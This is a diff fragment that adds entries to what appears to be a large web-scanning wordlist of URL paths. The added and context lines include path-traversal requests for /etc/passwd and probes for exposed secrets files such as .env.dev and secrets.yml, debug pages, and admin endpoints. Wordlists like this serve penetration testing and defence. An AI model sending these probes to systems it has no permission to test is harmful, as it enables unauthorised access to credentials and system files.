@@ -51281,3 +51281,9 @@ http://ifconfig.me/
 /common/down/file?filekey=/../../../../../../../../../etc/passwd
 /plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime
 /images//////////etc/passwd
+/_profiler/phpinfo?+--env=dev
+/adama/adama/downloadService?type=1&file=../../../../etc/passwd
+/__weave/file/etc/passwd
+/app/.env.dev
+/solr/admin/metrics?wt=json
+/app/config/secrets.yml
